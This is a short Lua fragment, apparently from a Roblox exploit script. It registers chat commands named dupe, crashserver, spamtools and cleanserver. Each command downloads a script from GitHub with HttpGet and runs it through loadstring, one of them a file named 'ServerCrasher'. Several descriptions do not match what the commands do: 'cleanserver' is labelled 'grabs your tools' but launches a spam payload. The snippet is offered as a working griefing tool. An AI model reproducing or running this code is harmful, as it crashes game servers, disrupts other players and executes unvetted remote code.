...
AddCommand("dupe", {"dp"}, "dupes your tools", {"1", 1, {"protect"}}, function(Caller, Args, CEnv)
...
AddCommand("crashserver", {"crash"}, "grabs your tools", {}, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/spam.lua", true))()
loadstring(game:HttpGet("https://raw.githubusercontent.com/harunscripts/scripts/main/DHRPVC_ServerCrasher.lua"))()
end)

AddCommand("spamtools", {"spamradio"}, "grabs your tools", {}, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/spam.lua", true))()
end)


AddCommand("cleanserver", {"clean"}, "grabs your tools", {}, function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/v9h/dhrpvc/main/spam.lua", true))()
end)
